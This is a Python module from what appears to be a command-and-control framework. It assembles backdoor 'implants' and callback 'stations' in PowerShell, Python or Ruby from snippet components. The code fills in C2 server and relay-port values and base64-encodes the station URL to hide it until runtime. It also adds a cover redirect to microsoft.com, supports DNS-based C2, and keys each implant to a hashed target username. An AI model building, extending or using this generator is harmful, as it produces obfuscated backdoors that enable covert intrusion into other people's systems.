# bab/generate.py — component-based implant and station generator

import base64
import hashlib
import json
import re
from datetime import datetime
from pathlib import Path

from .config import HERE, ROOT
from .ui import section, ok, err, info, prompt, cyan, grey, bold, BuildAborted

SNIPPETS_DIR    = HERE.parent / "code_snippets" / "implants_and_stations"
IMPLANTS_OUT    = ROOT / "backdoors" / "implants"
STATIONS_OUT    = ROOT / "backdoors" / "stations"

SUPPORTED_LANGUAGES = ["Powershell", "Python", "Ruby"]

LANG_EXT = {
    "Powershell": ".ps1",
    "Python":     ".py",
    "Ruby":       ".rb",
}

# Assembly order for each artifact type
IMPLANT_COMPONENTS = ["keying", "crypto", "channel", "execution"]
STATION_COMPONENTS = ["station_crypto", "station_channel"]

# ── Component discovery ───────────────────────────────────────────────────────

def _extract_first_object(text: str) -> str | None:
    """Extract the first balanced {...} block from a JS module file."""
    try:
        start = text.index('{')
    except ValueError:
        return None
    depth = 0
    for i, ch in enumerate(text[start:], start):
        if ch == '{':
            depth += 1
        elif ch == '}':
            depth -= 1
            if depth == 0:
                return text[start:i + 1]
    return None

def _load_manifest(component_dir: Path) -> dict | None:
    m = component_dir / "manifest.js"
    if not m.exists():
        return None
    try:
        raw = _extract_first_object(m.read_text())
        return json.loads(raw) if raw else None
    except Exception:
        return None

def _find_code_file(component_dir: Path, ext: str) -> Path | None:
    for f in sorted(component_dir.iterdir()):
        if f.suffix == ext and f.name not in ("ComponentHandler.js", "manifest.js"):
            return f
    return None

def _get_components(language: str, component_type: str) -> list:
    base = SNIPPETS_DIR / language / component_type
    if not base.exists():
        return []
    results = []
    for d in sorted(base.iterdir()):
        if d.is_dir():
            m = _load_manifest(d)
            if m:
                results.append({"title": m.get("title", d.name), "path": d, "manifest": m})
    return results

# ── Interactive selection ─────────────────────────────────────────────────────

def _pick_component(component_type: str, components: list) -> dict | None:
    if not components:
        return None
    # Strip station_ prefix for display
    label = component_type.replace("station_", "").capitalize()
    if len(components) == 1:
        info(f"{label:<14} {components[0]['title']}")
        return components[0]
    print(f"\n  {bold(label)}:")
    for i, c in enumerate(components):
        print(f"    [{i}]  {c['title']}")
    while True:
        try:
            raw = input(f"  Select [0]: ").strip() or "0"
        except (EOFError, KeyboardInterrupt):
            print()
            raise BuildAborted("Aborted.")
        if raw.isdigit() and int(raw) < len(components):
            return components[int(raw)]
        err("Invalid selection")

# ── Placeholder substitution ──────────────────────────────────────────────────

def _apply_subs(code: str, subs: dict) -> str:
    for placeholder, value in subs.items():
        code = code.replace("{{" + placeholder + "}}", value)
    return code

def _build_subs(component_type: str, manifest: dict, cfg: dict, extra: dict) -> dict:
    subs = {}
    for p in manifest.get("parameters", []):
        name = p["name"]
        if name == "key":
            subs["KEY"] = cfg["key"]
        elif name == "iv":
            subs["IV"] = cfg["iv"]
        elif name == "implant_id":
            subs["IMP_ID"] = cfg["imp_id"]
        elif name == "station":
            if component_type == "keying":
                # Keying encodes the station URL as base64 — decrypted at runtime by Crypto.dec()
                subs["STATION"] = base64.b64encode(cfg["url"].encode()).decode()
            else:
                subs["STATION"] = cfg["url"]
        elif name == "c2_server":
            # Station calls back to ThornC2 — use the separate c2_url
            subs["C2_SERVER"] = cfg.get("c2_url", cfg["url"])
        elif name == "relay_port":
            subs["RELAY_PORT"] = str(cfg.get("relay_port", 4444))
        elif name == "cover_redirect":
            subs["COVER_REDIRECT"] = cfg.get("cover_redirect", "https://www.microsoft.com")
        elif name == "dns_domain":
            subs["DNS_DOMAIN"] = extra.get("dns_domain", "")
        elif name == "username":
            subs["USERNAME"] = hashlib.md5(extra.get("username", "").encode()).hexdigest()
    return subs

def _section_comment(title: str) -> str:
    bar = "─" * max(0, 44 - len(title) - 5)
    return f"# ── {title} {bar}"

# ── Shared assembly core ──────────────────────────────────────────────────────

def _assemble(language: str, component_order: list, cfg: dict, extra: dict,
              output_dir: Path, prefix: str) -> bool:
    ext = LANG_EXT.get(language)
    if not ext:
        err(f"Unsupported language: {language}")
        return False

    # Discover and select components
    available = {ct: _get_components(language, ct) for ct in component_order}
    available = {ct: comps for ct, comps in available.items() if comps}

    if not available:
        err("No components available for this language/type combination")
        return False

    has_choice = any(len(c) > 1 for c in available.values())
    if has_choice:
        print()

    chosen = {}
    for ct in component_order:
        if ct not in available:
            continue
        c = _pick_component(ct, available[ct])
        if c:
            chosen[ct] = c

    if not chosen:
        err("No components selected")
        return False

    # Prompt for any extra parameters needed by the selected components
    needs_username = "keying" in chosen and any(
        p["name"] == "username"
        for p in chosen["keying"]["manifest"].get("parameters", [])
    )
    if needs_username and "username" not in extra:
        print()
        extra["username"] = prompt("Target username", "",
                                   lambda v: True if v else "Username required")

    needs_dns_domain = any(
        p["name"] == "dns_domain"
        for ct in chosen
        for p in chosen[ct]["manifest"].get("parameters", [])
    )
    if needs_dns_domain and "dns_domain" not in extra:
        print()
        extra["dns_domain"] = prompt("DNS C2 domain   ", "",
                                     lambda v: True if v else "Domain required")

    # Assemble source
    parts = []
    for ct in component_order:
        if ct not in chosen:
            continue
        c = chosen[ct]
        code_file = _find_code_file(c["path"], ext)
        if not code_file:
            err(f"No {ext} source file in {c['path'].name}")
            return False
        code = _apply_subs(code_file.read_text(),
                           _build_subs(ct, c["manifest"], cfg, extra))
        parts.append(_section_comment(c["title"]))
        parts.append(code)

    output_dir.mkdir(parents=True, exist_ok=True)
    ts       = datetime.now().strftime("%Y%m%d_%H%M%S")
    out_name = f"{prefix}_{language.lower()}_{ts}{ext}"
    out_path = output_dir / out_name
    out_path.write_text("\n".join(parts))
    print()
    rel = out_path.relative_to(ROOT)
    ok(f"{rel}  ({out_path.stat().st_size:,} bytes)")
    return True

# ── Public generators ─────────────────────────────────────────────────────────

def generate_implant(language: str, cfg: dict) -> bool:
    section(f"Generate {language} Implant")
    if not (SNIPPETS_DIR / language).exists():
        err(f"No snippets found for: {language}")
        return False
    return _assemble(language, IMPLANT_COMPONENTS, cfg, {}, IMPLANTS_OUT, "implant")

def generate_station(language: str, cfg: dict) -> bool:
    section(f"Generate {language} Station")
    if not (SNIPPETS_DIR / language).exists():
        err(f"No snippets found for: {language}")
        return False
    return _assemble(language, STATION_COMPONENTS, cfg, {}, STATIONS_OUT, "station")

def list_generators() -> dict:
    """Return {language: [artifact_types]} for all available generators."""
    result = {}
    for lang in SUPPORTED_LANGUAGES:
        lang_dir = SNIPPETS_DIR / lang
        if not lang_dir.exists():
            continue
        types = []
        if any(_get_components(lang, ct) for ct in IMPLANT_COMPONENTS):
            types.append("implant")
        if any(_get_components(lang, ct) for ct in STATION_COMPONENTS):
            types.append("station")
        if types:
            result[lang] = types
    return result
